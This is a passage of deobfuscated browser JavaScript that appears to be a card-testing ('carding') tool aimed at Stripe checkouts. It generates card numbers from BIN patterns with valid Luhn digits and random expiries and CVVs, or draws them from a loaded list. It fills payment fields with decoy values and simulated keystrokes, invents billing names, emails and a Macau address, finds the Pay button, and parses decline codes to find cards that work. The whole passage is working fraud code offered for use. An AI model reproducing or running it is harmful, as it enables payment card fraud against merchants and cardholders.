          let v_2_2 = false;
          for (let v_1_3 = p_1_1.length - 1; v_1_3 >= 0; v_1_3--) {
            let v_1_4 = Number.parseInt(p_1_1[v_1_3]);
            if (v_2_2) {
              v_1_4 *= 2, v_1_4 > 9 && (v_1_4 -= 9);
            }
            v_1_2 += v_1_4, v_2_2 = !v_2_2;
          }
          return v_1_2;
        }
        for (let v_1_2 = 0; v_1_2 < 10; v_1_2++) {
          if (fn_1_3(p_1 + v_1_2) % 10 === 0) {
            return v_1_2;
          }
        }
        return 0;
      }
      function fn_41(p_1) {
        const v_1_2 = p_1.replace(/[^0-9]/g, '').substring(0, 2);
        return v_1_2 === '34' || v_1_2 === '37';
      }
      function fn_42(p_1) {
        if (!p_1) return null;
        let v_1_2 = p_1,
          v_2_2 = null,
          v_3_2 = null,
          v_4_2 = null;
        if (p_1.includes('|')) {
          const v_1_3 = p_1.split('|');
          v_1_2 = v_1_3[0], v_2_2 = v_1_3[1] || null, v_3_2 = v_1_3[2] || null, v_4_2 = v_1_3[3] || null;
        }
        v_1_2 = v_1_2.replace(/[^0-9xX]/g, '');
        let v_5_2 = '';
        for (const v_1_3 of v_1_2) {
          v_5_2 += v_1_3 === 'x' || v_1_3 === 'X' ? Math.floor(Math.random() * 10) : v_1_3;
        }
        const v_6_2 = fn_41(v_1_2) ? 15 : 16,
          v_7_2 = v_6_2 - v_5_2.length - 1;
        for (let v_1_3 = 0; v_1_3 < v_7_2; v_1_3++) {
          v_5_2 += Math.floor(Math.random() * 10);
        }
        const v_8_2 = fn_40(v_5_2),
          v_9_2 = v_5_2 + v_8_2;
        function fn_1_3() {
          const v_1_3 = new Date(),
            v_2_3 = v_1_3.getMonth() + 1,
            v_3_3 = v_1_3.getFullYear(),
            v_4_3 = v_3_3 + Math.floor(Math.random() * 6) + 1,
            v_5_3 = v_4_3 === v_3_3 ? Math.floor(Math.random() * (12 - v_2_3 + 1)) + v_2_3 : Math.floor(Math.random() * 12) + 1;
          return String(v_5_3).padStart(2, '0');
        }
        function fn_2_2() {
          return String(new Date().getFullYear() + Math.floor(Math.random() * 6) + 1).slice(-2);
        }
        function fn_3_2(p_1_1) {
          if (fn_41(p_1_1 || '')) return String(Math.floor(Math.random() * 10000)).padStart(4, '0');else {
            return String(Math.floor(Math.random() * 1000)).padStart(3, '0');
          }
        }
        function fn_4_2(p_1_1) {
          if (!p_1_1) return fn_1_3();
          p_1_1 = p_1_1.trim();
          if (p_1_1 === 'xx' || p_1_1 === 'XX') {
            return fn_1_3();
          }
          const v_1_3 = parseInt(p_1_1);
          if (v_1_3 >= 1 && v_1_3 <= 12) return String(v_1_3).padStart(2, '0');
          return fn_1_3();
        }
        function fn_5_2(p_1_1) {
          if (!p_1_1) return fn_2_2();
          p_1_1 = p_1_1.trim();
          if (p_1_1 === 'xx' || p_1_1 === 'XX') return fn_2_2();
          const v_1_3 = parseInt(p_1_1);
          if (v_1_3 >= 0 && v_1_3 <= 99) return String(v_1_3).padStart(2, '0');
          if (v_1_3 >= 2000 && v_1_3 <= 2099) return String(v_1_3).slice(-2);
          return fn_2_2();
        }
        function fn_6_2(p_1_1, p_2) {
          if (!p_1_1) {
            return fn_3_2(p_2);
          }
          p_1_1 = p_1_1.trim().toUpperCase();
          const v_1_3 = fn_41(p_2 || '') ? 4 : 3;
          if (p_1_1 === "RND" || p_1_1 === "RANDOM" || p_1_1 === "XXXX" || p_1_1 === "XXX" || p_1_1 === 'XX') return fn_3_2(p_2);
          let v_2_3 = '';
          for (const v_1_4 of p_1_1) {
            v_2_3 += v_1_4 === 'X' ? Math.floor(Math.random() * 10) : v_1_4;
          }
          if (v_2_3.length < v_1_3) {
            v_2_3 = v_2_3.padStart(v_1_3, '0');
          }
          return v_2_3.substring(0, v_1_3);
        }
        const v_10_2 = fn_4_2(v_2_2),
          v_11_2 = fn_5_2(v_3_2);
        const v_12_1 = fn_6_2(v_4_2, v_9_2),
          v_13_1 = {};
        v_13_1.card = v_9_2, v_13_1.month = v_10_2;
        v_13_1.year = v_11_2, v_13_1.cvv = v_12_1;
        const v_14_1 = v_13_1;
        return v_14_1;
      }
      function fn_43(p_1, p_2) {
        if (!p_1) return;
        p_1.focus();
        const v_1_2 = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value")?.["set"],
          v_2_2 = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value")?.["set"];
        if (p_1.tagName === "INPUT" && v_1_2) v_1_2.call(p_1, p_2);else p_1.tagName === "TEXTAREA" && v_2_2 ? v_2_2.call(p_1, p_2) : p_1.value = p_2;
        const v_3_2 = {};
        v_3_2.bubbles = true;
        p_1.dispatchEvent(new Event("input", v_3_2));
        const v_4_2 = {};
        v_4_2.bubbles = true, p_1.dispatchEvent(new Event("change", v_4_2));
        const v_5_2 = {};
        v_5_2.bubbles = true, p_1.dispatchEvent(new KeyboardEvent("keyup", v_5_2)), p_1.blur();
      }
      function fn_44(p_1, p_2) {
        if (!p_1) return;
        p_1.focus(), p_1.value = p_2;
        const v_1_2 = {};
        v_1_2.bubbles = true, p_1.dispatchEvent(new Event("input", v_1_2));
        const v_2_2 = {};
        v_2_2.bubbles = true, p_1.dispatchEvent(new Event("change", v_2_2));
        const v_3_2 = {};
        v_3_2.value = p_2;
        const v_4_2 = v_3_2,
          v_5_2 = {};
        v_5_2.bubbles = true, v_5_2.detail = v_4_2;
        const v_6_2 = v_5_2;
        p_1.dispatchEvent(new CustomEvent("select:change", v_6_2)), p_1.blur();
      }
      const v_73 = ["AkiftOP"],
        v_74 = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Charles", "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", "Jessica", "Sarah", "Karen"],
        v_75 = ["Main Street", "Oak Road", "Park Avenue", "Maple Drive", "Cedar Lane", "Pine Street", "Lake Drive", "Forest Avenue", "River Road", "Hill Street"];
      function fn_45() {
        return v_73[Math.floor(Math.random() * v_73.length)];
      }
      function fn_46() {
        const v_1_2 = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "icloud.com"],
          v_2_2 = v_74[Math.floor(Math.random() * v_74.length)].toLowerCase();
        const v_3_2 = Math.floor(Math.random() * 9999);
        const v_4_2 = v_1_2[Math.floor(Math.random() * v_1_2.length)];
        return v_2_2 + v_3_2 + '@' + v_4_2;
      }
      function fn_47() {
        return Math.floor(Math.random() * 999) + 1 + '\x20' + v_75[Math.floor(Math.random() * v_75.length)];
      }
      async function fn_48() {
        let v_1_2, v_2_2;
        let v_3_2;
        let v_4_2;
        if (v_37 === 'cc') {
          if (v_38.length === 0 || v_39 >= v_38.length) {
            fn_35("\u274C No more CCs in list", "error"), fn_67();
            return;
          }
          const v_1_3 = fn_68();
          if (!v_1_3) {
            fn_35("\u274C No more CCs in list", "error"), fn_67();
            return;
          }
          v_1_2 = v_1_3.number, v_2_2 = v_1_3.month, v_3_2 = v_1_3.year, v_4_2 = v_1_3.cvv;
          const v_2_3 = document.querySelector(".cc-info");
          if (v_2_3) {
            v_2_3.textContent = v_39 + '/' + v_38.length + " used";
          }
        } else {
          const v_1_3 = fn_34();
          if (!v_1_3) return;
          const v_2_3 = fn_42(v_1_3);
          if (!v_2_3) return;
          v_1_2 = v_2_3.card, v_2_2 = v_2_3.month, v_3_2 = v_2_3.year, v_4_2 = v_2_3.cvv;
        }
        window.generatedCard = v_1_2, window.generatedCardFull = v_1_2 + '|' + v_2_2 + '|' + v_3_2 + '|' + v_4_2, v_68.cardNumber = v_1_2, v_68.cardExpiry = v_2_2 + '/' + v_3_2, v_68.cardCvc = v_4_2, fn_36(v_1_2, v_2_2, v_3_2, v_4_2);
        const v_5_2 = "0000000000000000",
          v_6_2 = "01/30",
          v_7_2 = "000",
          v_8_2 = {
            'selectors': ["#cardNumber", "[name=\"cardNumber\"]", "[autocomplete=\"cc-number\"]", "[data-elements-stable-field-name=\"cardNumber\"]", "input[placeholder*=\"Card number\"]", "input[placeholder*=\"card number\"]", "input[aria-label*=\"Card number\"]", "[class*=\"CardNumberInput\"] input", "[class*=\"cardNumber\"] input", "input[name=\"number\"]", "input[id*=\"card-number\"]", "input[name*=\"card_number\"]", "input[placeholder*=\"0000\"]", "input[placeholder*=\"1234\"]"],
            'value': v_5_2,
            'realValue': v_1_2
          },
          v_9_2 = {
            'selectors': ["#cardExpiry", "[name=\"cardExpiry\"]", "[autocomplete=\"cc-exp\"]", "[data-elements-stable-field-name=\"cardExpiry\"]", "input[placeholder*=\"MM / YY\"]", "input[placeholder*=\"MM/YY\"]", "input[placeholder*=\"MM\"]", "input[aria-label*=\"expir\"]", "[class*=\"CardExpiry\"] input", "[class*=\"expiry\"] input", "input[name=\"expiry\"]", "input[name=\"exp\"]"],
            'value': v_6_2,
            'realValue': v_2_2 + '/' + v_3_2
          },
          v_10_2 = {
            'selectors': ["#cardCvc", "[name=\"cardCvc\"]", "[autocomplete=\"cc-csc\"]", "[data-elements-stable-field-name=\"cardCvc\"]", "input[placeholder*=\"CVC\"]", "input[placeholder*=\"CVV\"]", "input[aria-label*=\"CVC\"]", "input[aria-label*=\"CVV\"]", "input[aria-label*=\"security code\"]", "[class*=\"CardCvc\"] input", "[class*=\"cvc\"] input", "input[name=\"cvc\"]", "input[name=\"cvv\"]"],
            'value': v_7_2,
            'realValue': v_4_2
          },
          v_11_2 = [v_8_2, v_9_2, v_10_2, {
            'selectors': ["#billingName", "[name=\"billingName\"]", "[autocomplete=\"cc-name\"]", "[autocomplete=\"name\"]", "input[placeholder*=\"Name on card\"]", "input[placeholder*=\"name on card\"]", "input[aria-label*=\"Name\"]", "[class*=\"billingName\"] input", "input[name=\"name\"]"],
            'value': v_48 || fn_45()
          }, {
            'selectors': ["input[type=\"email\"]", "input[name*=\"email\"]", "input[autocomplete=\"email\"]", "input[id*=\"email\"]", "input[placeholder*=\"email\"]", "input[placeholder*=\"Email\"]", "[class*=\"email\"] input", "input[aria-label*=\"email\"]"],
            'value': v_49 || fn_46()
          }, {
            'selectors': ["#billingAddressLine1", "[name=\"billingAddressLine1\"]", "[autocomplete=\"address-line1\"]"],
            'value': fn_47()
          }, {
            'selectors': ["#billingLocality", "[name=\"billingLocality\"]", "[autocomplete=\"address-level2\"]"],
            'value': "Macau"
          }, {
            'selectors': ["#billingPostalCode", "[name=\"billingPostalCode\"]", "[autocomplete=\"postal-code\"]"],
            'value': "999078"
          }];
        for (const v_1_3 of v_11_2) {
          for (const v_1_4 of v_1_3.selectors) {
            const v_1_5 = document.querySelector(v_1_4);
            if (v_1_5) {
              fn_43(v_1_5, v_1_3.value);
              v_1_3.realValue && (v_1_5.dataset.realValue = v_1_3.realValue);
              await new Promise(p_1 => setTimeout(p_1, 8));
              break;
            }
          }
        }
        await fn_49(v_1_2, v_2_2, v_3_2, v_4_2);
        const v_12_1 = ["#billingCountry", "[name=\"billingCountry\"]", "[autocomplete=\"country\"]"];
        for (const v_1_3 of v_12_1) {
          const v_1_4 = document.querySelector(v_1_3);
          if (v_1_4) {
            fn_44(v_1_4, 'MO');
            break;
          }
        }
        await new Promise(p_1 => setTimeout(p_1, 30));
      }
      async function fn_49(p_1, p_2, p_3, p_4) {
        const fn_1_3 = p_1_1 => new Promise(p_1_2 => setTimeout(p_1_2, p_1_1)),
          v_1_2 = document.querySelectorAll("iframe[name*=\"__privateStripeFrame\"], iframe[title*=\"Secure\"], iframe[src*=\"stripe\"]");
        for (const v_1_3 of v_1_2) {
          try {
            const v_1_4 = v_1_3.getBoundingClientRect();
            if (v_1_4.width > 0 && v_1_4.height > 0) {
              const v_1_5 = document.elementFromPoint(v_1_4.left + v_1_4.width / 2, v_1_4.top + v_1_4.height / 2);
              if (v_1_5) {
                v_1_5.click();
              }
              await fn_1_3(20);
            }
          } catch (v_1_4) {}
        }
        const v_2_2 = document.querySelectorAll("[class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"PaymentElement\"]");
        for (const v_1_3 of v_2_2) {
          try {
            const v_1_4 = v_1_3.getBoundingClientRect();
            if (v_1_4.width > 0 && v_1_4.height > 0) {
              v_1_3.click(), await fn_1_3(20);
            }
          } catch (v_1_4) {}
        }
        if (fn_20()) {
          await fn_50(p_1, p_2, p_3, p_4);
        }
      }
      async function fn_50(p_1, p_2, p_3, p_4) {
        const fn_1_3 = p_1_1 => new Promise(p_1_2 => setTimeout(p_1_2, p_1_1));
        async function fn_2_2(p_1_1, p_2_1 = 20) {
          for (const v_1_3 of p_1_1) {
            const v_1_4 = new KeyboardEvent("keydown", {
                'key': v_1_3,
                'code': "Key" + v_1_3.toUpperCase(),
                'bubbles': true,
                'cancelable': true
              }),
              v_2_3 = {};
            v_2_3.key = v_1_3, v_2_3.bubbles = true;
            const v_3_2 = v_2_3,
              v_4_2 = new KeyboardEvent("keypress", v_3_2),
              v_5_2 = {
                'data': v_1_3,
                'inputType': "insertText",
                'bubbles': true
              },
              v_6_2 = new InputEvent("input", v_5_2),
              v_7_2 = {};
            v_7_2.key = v_1_3, v_7_2.bubbles = true;
            const v_8_2 = v_7_2,
              v_9_2 = new KeyboardEvent("keyup", v_8_2);
            document.activeElement?.["dispatchEvent"](v_1_4), document.activeElement?.["dispatchEvent"](v_4_2), document.activeElement?.["dispatchEvent"](v_6_2), document.activeElement?.["dispatchEvent"](v_9_2), await fn_1_3(p_2_1);
          }
        }
        async function fn_3_2() {
          const v_1_3 = new KeyboardEvent("keydown", {
              'key': "Tab",
              'code': "Tab",
              'keyCode': 0x9,
              'bubbles': true
            }),
            v_2_3 = new KeyboardEvent("keyup", {
              'key': "Tab",
              'bubbles': true
            });
          document.activeElement?.["dispatchEvent"](v_1_3), document.activeElement?.["dispatchEvent"](v_2_3);
          await fn_1_3(140);
        }
        async function fn_4_2(p_1_1) {
          for (const v_1_3 of p_1_1) {
            try {
              const v_1_4 = document.querySelectorAll(v_1_3);
              for (const v_1_5 of v_1_4) {
                const v_1_6 = v_1_5.getBoundingClientRect();
                if (v_1_6.width > 0 && v_1_6.height > 0) {
                  return v_1_5.click(), v_1_5.focus?.(), await fn_1_3(140), true;
                }
              }
            } catch (v_1_4) {}
          }
          return false;
        }
        const v_1_2 = ["[class*=\"CardNumberElement\"]", "[class*=\"cardNumber\"]", "[data-field=\"number\"]", "iframe[title*=\"card number\" i]", "iframe[name*=\"cardNumber\"]", "input[placeholder*=\"0000\"]", "input[placeholder*=\"1234\"]", "input[autocomplete=\"cc-number\"]", "[class*=\"CardNumber\"] input", "[class*=\"card-number\"] input"];
        let v_2_2 = await fn_4_2(v_1_2);
        if (!v_2_2) {
          const v_1_3 = document.querySelectorAll("[class*=\"StripeElement\"], [class*=\"CardElement\"], [class*=\"PaymentElement\"]");
          for (const v_1_4 of v_1_3) {
            const v_1_5 = v_1_4.getBoundingClientRect();
            if (v_1_5.width > 100 && v_1_5.height > 20) {
              v_1_4.click(), await fn_1_3(200), v_2_2 = true;
              break;
            }
          }
        }
        if (!v_2_2) {
          const v_1_3 = document.querySelector("[class*=\"payment\"], [class*=\"Payment\"], [class*=\"card\"], [class*=\"Card\"], form");
          if (v_1_3) {
            const v_1_4 = v_1_3.querySelector("input[type=\"text\"], input:not([type]), [contenteditable]");
            v_1_4 && (v_1_4.click(), v_1_4.focus?.(), await fn_1_3(140), v_2_2 = true);
          }
        }
        if (v_2_2) {
          const v_1_3 = "1|4|7|6|5|0|3|2".split('|');
          let v_2_3 = 0;
          while (true) {
            switch (v_1_3[v_2_3++]) {
              case '0':
                await fn_3_2();
                continue;
              case '1':
                await fn_2_2(p_1, 20);
                continue;
              case '2':
                await fn_1_3(200);
                continue;
              case '3':
                await fn_2_2(p_4, 20);
                continue;
              case '4':
                await fn_1_3(200);
                continue;
              case '5':
                await fn_1_3(200);
                continue;
              case '6':
                await fn_2_2(p_2 + p_3, 20);
                continue;
              case '7':
                await fn_3_2();
                continue;
            }
            break;
          }
        }
      }
      function fn_51(p_1) {
        if (!p_1) return false;
        const v_1_2 = p_1.getBoundingClientRect(),
          v_2_2 = v_1_2.left + v_1_2.width / 2;
        const v_3_2 = v_1_2.top + v_1_2.height / 2,
          v_4_2 = document.elementFromPoint(v_2_2, v_3_2) || p_1,
          v_5_2 = {};
        v_5_2.bubbles = true;
        v_5_2.cancelable = true;
        v_5_2.view = window, v_5_2.clientX = v_2_2, v_5_2.clientY = v_3_2, v_5_2.button = 0x0, v_5_2.detail = 0x1, v_5_2.composed = true;
        const v_6_2 = v_5_2,
          v_7_2 = v_6_2,
          v_8_2 = {
            ...v_7_2
          },
          v_9_2 = v_8_2;
        v_9_2.bubbles = false;
        return v_4_2.dispatchEvent(new MouseEvent("mouseenter", v_9_2)), v_4_2.dispatchEvent(new MouseEvent("mouseover", v_7_2)), v_4_2.dispatchEvent(new MouseEvent("mousemove", v_7_2)), v_4_2.dispatchEvent(new MouseEvent("mousedown", v_7_2)), v_4_2.focus?.(), v_4_2.dispatchEvent(new MouseEvent("mouseup", v_7_2)), v_4_2.dispatchEvent(new MouseEvent("click", v_7_2)), v_4_2 !== p_1 && p_1.dispatchEvent(new MouseEvent("click", v_7_2)), true;
      }
      function fn_52(p_1) {
        if (!p_1) return false;
        const v_1_2 = p_1.getBoundingClientRect(),
          v_2_2 = v_1_2.left + v_1_2.width / 2,
          v_3_2 = v_1_2.top + v_1_2.height / 2,
          v_4_2 = {
            'bubbles': true,
            'cancelable': true,
            'view': window,
            'clientX': v_2_2,
            'clientY': v_3_2,
            'pointerId': 0x1,
            'pointerType': "mouse",
            'isPrimary': true,
            'button': 0x0,
            'buttons': 0x1,
            'composed': true
          },
          v_5_2 = v_4_2;
        p_1.dispatchEvent(new PointerEvent("pointerover", v_5_2));
        const v_6_2 = {
            ...v_5_2
          },
          v_7_2 = v_6_2;
        v_7_2.bubbles = false, p_1.dispatchEvent(new PointerEvent("pointerenter", v_7_2)), p_1.dispatchEvent(new PointerEvent("pointerdown", v_5_2)), p_1.dispatchEvent(new PointerEvent("pointerup", v_5_2));
        const v_8_2 = {};
        v_8_2.bubbles = true, v_8_2.cancelable = true, v_8_2.view = window, v_8_2.clientX = v_2_2, v_8_2.clientY = v_3_2, v_8_2.button = 0x0, v_8_2.detail = 0x1, v_8_2.composed = true;
        const v_9_2 = v_8_2;
        return p_1.dispatchEvent(new MouseEvent("click", v_9_2)), p_1.click?.(), true;
      }
      async function fn_53() {
        if (v_58) return;
        const fn_1_3 = p_1 => new Promise(p_1_1 => setTimeout(p_1_1, p_1)),
          fn_2_2 = () => {
            const v_1_3 = document.querySelectorAll("input");
            for (const v_1_4 of v_1_3) {
              const v_1_5 = (v_1_4.placeholder || '').toLowerCase(),
                v_2_4 = (v_1_4.getAttribute("aria-label") || '').toLowerCase();
              if ((v_1_5.includes("card number") || v_1_5.includes("1234") || v_2_4.includes("card number")) && v_1_4.getBoundingClientRect().height > 10) return true;
            }
            const v_2_3 = document.querySelectorAll("[class*=\"CardField\"], [class*=\"cardField\"], [class*=\"CardNumberField\"], [class*=\"card-number\"]");
            for (const v_1_4 of v_2_3) {
              if (v_1_4.getBoundingClientRect().height > 40) {
                return true;
              }
            }
            const v_3_2 = document.querySelector("input[value=\"card\"]");
            if (v_3_2 && v_3_2.checked) return true;
            return false;
          },
          v_1_2 = document.querySelector("input[value=\"card\"]");
        if (!v_1_2) return v_58 = true, false;
        if (v_1_2.checked) {
          await fn_1_3(80);
          if (fn_2_2()) return v_58 = true, true;
        }
        const fn_3_2 = () => {
            const v_1_3 = [],
              v_2_3 = document.querySelectorAll("[class*=\"AccordionItem\"] [class*=\"title\"], [class*=\"Accordion\"] [class*=\"Title\"]");
            for (const v_1_4 of v_2_3) {
              if ((v_1_4.textContent || '').toLowerCase().includes("card")) {
                v_1_3.push(v_1_4);
              }
            }
            const v_3_2 = v_1_2.closest("[class*=\"AccordionItem\"]");
            if (v_3_2) {
              const v_1_4 = v_3_2.querySelector("[class*=\"Cover\"], [class*=\"Header\"], [class*=\"Title\"]");
              v_1_4 && v_1_3.push(v_1_4), v_1_3.push(v_3_2);
            }
            let v_4_2 = v_1_2.parentElement;
            for (let v_1_4 = 0; v_1_4 < 5 && v_4_2; v_1_4++) {
              !v_1_3.includes(v_4_2) && v_4_2.tagName !== "BODY" && v_1_3.push(v_4_2), v_4_2 = v_4_2.parentElement;
            }
            const v_5_2 = v_1_2.closest("label");
            v_5_2 && !v_1_3.includes(v_5_2) && v_1_3.unshift(v_5_2);
            const v_6_2 = v_1_2.closest("[role=\"radio\"]");
            v_6_2 && !v_1_3.includes(v_6_2) && v_1_3.unshift(v_6_2);
            const v_7_2 = v_1_2.closest("[class*=\"Option\"]");
            return v_7_2 && !v_1_3.includes(v_7_2) && v_1_3.unshift(v_7_2), v_1_3.filter(p_1 => p_1.getBoundingClientRect().width > 0);
          },
          v_2_2 = fn_3_2();
        for (let v_1_3 = 1; v_1_3 <= 3; v_1_3++) {
          for (let v_1_4 = 0; v_1_4 < v_2_2.length; v_1_4++) {
            fn_52(v_2_2[v_1_4]), await fn_1_3(60);
            if (fn_2_2()) return v_58 = true, true;
            fn_51(v_2_2[v_1_4]), await fn_1_3(60), v_1_2.checked = true;
            const v_1_5 = {};
            v_1_5.bubbles = true, v_1_2.dispatchEvent(new Event("change", v_1_5)), await fn_1_3(120);
            if (fn_2_2()) return v_58 = true, true;
            v_2_2[v_1_4].click(), await fn_1_3(120);
            if (fn_2_2()) {
              return v_58 = true, true;
            }
            v_2_2[v_1_4].scrollIntoView({
              'behavior': "instant",
              'block': "center"
            }), await fn_1_3(40), fn_51(v_2_2[v_1_4]), await fn_1_3(120);
            if (fn_2_2()) return v_58 = true, true;
          }
          v_1_2.scrollIntoView({
            'behavior': "instant",
            'block': "center"
          }), await fn_1_3(40), fn_51(v_1_2);
          try {
            const v_1_4 = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "checked").set;
            v_1_4.call(v_1_2, true);
            const v_2_3 = {};
            v_2_3.bubbles = true, v_1_2.dispatchEvent(new Event("input", v_2_3));
            const v_3_2 = {};
            v_3_2.bubbles = true, v_1_2.dispatchEvent(new Event("change", v_3_2));
          } catch (v_1_4) {}
          await fn_1_3(200);
          if (fn_2_2()) return v_58 = true, true;
        }
        return v_58 = true, false;
      }
      async function fn_54() {
        if (!fn_20()) return;
        const fn_1_3 = p_1 => new Promise(p_1_1 => setTimeout(p_1_1, p_1));
        await fn_1_3(300);
        if (!v_59) {
          const v_1_2 = document.querySelectorAll("button, [role=\"button\"], [class*=\"Section\"], [class*=\"Option\"], [class*=\"Method\"], label");
          for (const v_1_3 of v_1_2) {
            const v_1_4 = (v_1_3.textContent || '').trim();
            if (v_1_4 === "Card" || /^Card$/i.test(v_1_4) || v_1_4.includes("Card") && v_1_4.length < 20) {
              const v_1_5 = v_1_3.getBoundingClientRect();
              if (v_1_5.width > 0 && v_1_5.height > 0) {
                fn_52(v_1_3), v_59 = true, await fn_1_3(150);
                break;
              }
            }
          }
        }
        const fn_2_2 = () => {
          const v_1_2 = ["button[class*=\"Pay\"]", "button[type=\"submit\"]", "[class*=\"SubmitButton\"]", "[class*=\"PayButton\"]", "button[data-testid*=\"pay\"]", "button[data-testid*=\"submit\"]"];
          for (const v_1_3 of v_1_2) {
            const v_1_4 = document.querySelector(v_1_3);
            if (v_1_4 && v_1_4.getBoundingClientRect().width > 0) return v_1_4;
          }
          const v_2_2 = document.querySelectorAll("button");
          for (const v_1_3 of v_2_2) {
            const v_1_4 = (v_1_3.textContent || '').trim().toLowerCase();
            if (v_1_4 === "pay" || v_1_4.startsWith("pay ") || v_1_4.includes("pay $") || v_1_4.includes("pay \u20B9")) {
              if (v_1_3.getBoundingClientRect().width > 0) return v_1_3;
            }
          }
          return null;
        };
        return window.invoicePayButton = fn_2_2(), true;
      }
      function fn_55() {
        const v_1_2 = document.querySelector(".SubmitButton-IconContainer");
        if (v_1_2) {
          const v_1_3 = v_1_2.closest(".SubmitButton");
          if (v_1_3 && !v_1_3.disabled && !v_1_3.classList.contains("SubmitButton--incomplete") && window.getComputedStyle(v_1_3).opacity !== '0') {
            return true;
          }
        }
        if (fn_20()) {
          const v_1_3 = document.querySelectorAll("button");
          for (const v_1_4 of v_1_3) {
            const v_1_5 = (v_1_4.textContent || '').trim().toLowerCase();
            if ((v_1_5 === "pay" || v_1_5.startsWith("pay ") || v_1_5.includes("pay $")) && !v_1_4.disabled) return true;
          }
        }
        return false;
      }
      async function fn_56(p_1 = 10000) {
        const v_1_2 = Date.now();
        return new Promise(p_1_1 => {
          const fn_1_3 = () => {
            if (fn_55()) p_1_1(true);else {
              if (!v_33 || Date.now() - v_1_2 > p_1) p_1_1(false);else {
                setTimeout(fn_1_3, 50);
              }
            }
          };
          fn_1_3();
        });
      }
      function fn_57(p_1 = 15000) {
        return new Promise(p_1_1 => {
          v_65 = false, v_66 = p_1_1;
          setTimeout(() => {
            if (!v_65) {
              v_65 = true, v_66 && v_66();
            }
          }, p_1);
        });
      }
      function fn_58() {
        v_65 = true, v_66 && (v_66(), v_66 = null);
      }
      function fn_59(p_1, p_2) {
        if (p_2 && v_61.has(p_2)) {
          return;
        }
        if (p_2) {
          v_61.add(p_2), setTimeout(() => v_61.delete(p_2), 10000);
        }
        const v_1_2 = window.generatedCardFull || '';
        if (v_63 && v_1_2 === v_64) return;
        function fn_1_3(p_1_1, p_2_1 = 0) {
          if (p_2_1 > 10 || !p_1_1 || typeof p_1_1 !== "object") return false;
          if (p_1_1.decline_code) return false;
          if (p_1_1.error?.["decline_code"]) return false;
          if (p_1_1.failure_code) {
            return false;
          }
          if (p_1_1.error?.["failure_code"]) return false;
          if (p_1_1.charge?.["failure_code"]) return false;
          if (p_1_1.payment_intent?.["last_payment_error"]) return false;
          if (p_1_1.paymentIntent?.["last_payment_error"]) return false;
          if (p_1_1.error?.["code"] && typeof p_1_1.error.code === "string") {
            const v_1_4 = p_1_1.error.code.toLowerCase(),
              v_2_3 = ["insufficient_funds", "incorrect_cvc", "invalid_cvc", "card_declined", "expired_card", "incorrect_number", "do_not_honor", "generic_decline", "processing_error"];
            if (v_2_3.includes(v_1_4)) return false;
          }
          if (p_1_1.error?.["type"] === "card_error") return false;
          if (p_1_1.error?.["type"] === "invalid_request_error") return false;
          if (p_1_1.outcome?.["type"] === "issuer_declined") return false;
          if (p_1_1.outcome?.["network_status"] === "declined_by_network") return false;
          const v_1_3 = p_1_1.error?.["message"] || p_1_1.message || p_1_1.error_message || '';
          if (v_1_3) {
            const v_1_4 = v_1_3.toLowerCase(),
              v_2_3 = ["cvc", "cvv", "insufficient funds", "card declined", "expired", "incorrect number", "do not honor", "generic decline", "processing error", "invalid cvc", "incorrect cvc"];
            for (const v_1_5 of v_2_3) {
              if (v_1_4.includes(v_1_5)) return false;
            }
          }
          if (p_1_1.status === "succeeded") return true;
          if (p_1_1.intent_status === "succeeded") return true;
          if (p_1_1.success === true) {
            return true;
          }
          if (p_1_1.approved === true) {
            return true;
          }
          if (p_1_1.result === "success") return true;
          if (p_1_1.state === "succeeded") return true;
          if (p_1_1.payment_status === "paid") return true;
          if (p_1_1.charge_status === "succeeded") return true;
          if (p_1_1.paid === true && p_1_1.status === "succeeded") return true;
          if (p_1_1.payment_intent) {
            const v_1_4 = p_1_1.payment_intent;
            if (v_1_4.status === "succeeded" && !v_1_4.last_payment_error && !v_1_4.decline_code) return true;
          }
          if (p_1_1.paymentIntent) {
            const v_1_4 = p_1_1.paymentIntent;
            if (v_1_4.status === "succeeded" && !v_1_4.last_payment_error && !v_1_4.decline_code) return true;
          }
          if (p_1_1.charge) {
            const v_1_4 = p_1_1.charge;
            if (v_1_4.status === "succeeded" && v_1_4.paid === true && !v_1_4.failure_code && !v_1_4.decline_code) return true;
          }
          if (p_1_1.transaction?.["status"] === "approved" || p_1_1.transaction?.["status"] === "succeeded") return true;
          if (p_1_1.data) {
            if (p_1_1.data.status === "succeeded" && p_1_1.data.paid === true && !p_1_1.data.failure_code && !p_1_1.data.decline_code) return true;
          }
          if (Array.isArray(p_1_1.data) && p_1_1.data[0]?.["status"] === "succeeded") {
            return true;
          }
          for (const v_1_4 of Object.keys(p_1_1)) {
            if (typeof p_1_1[v_1_4] === "object" && p_1_1[v_1_4] !== null) {
              if (fn_1_3(p_1_1[v_1_4], p_2_1 + 1)) return true;
            }
          }
          return false;
        }
        function fn_2_2(p_1_1, p_2_1 = 0) {
          if (p_2_1 > 10 || !p_1_1 || typeof p_1_1 !== "object") return null;
          if (p_1_1.decline_code) return p_1_1.decline_code;
          if (p_1_1.error?.["decline_code"]) return p_1_1.error.decline_code;
          if (p_1_1.error?.["code"] && typeof p_1_1.error.code === "string" && p_1_1.error.code.includes('_')) return p_1_1.error.code;
          if (p_1_1.failure_code) return p_1_1.failure_code;
          if (p_1_1.outcome?.["reason"]) {
            return p_1_1.outcome.reason;
          }
          const v_1_3 = p_1_1.error?.["message"] || p_1_1.message || p_1_1.error_message || '';
          if (v_1_3) {
            const v_1_4 = v_1_3.toLowerCase();
            if (v_1_4.includes("insufficient funds")) return "insufficient_funds";
            if (v_1_4.includes("cvc") || v_1_4.includes("cvv")) {
              if (v_1_4.includes("incorrect")) return "incorrect_cvc";
              if (v_1_4.includes("invalid")) {
                return "invalid_cvc";
              }
              return "incorrect_cvc";
            }
            if (v_1_4.includes("card declined")) return "card_declined";
            if (v_1_4.includes("expired")) return "expired_card";
            if (v_1_4.includes("incorrect number")) return "incorrect_number";
            if (v_1_4.includes("do not honor")) return "do_not_honor";
          }
          for (const v_1_4 of Object.keys(p_1_1)) {
            if (typeof p_1_1[v_1_4] === "object" && p_1_1[v_1_4] !== null) {
              const v_1_5 = fn_2_2(p_1_1[v_1_4], p_2_1 + 1);
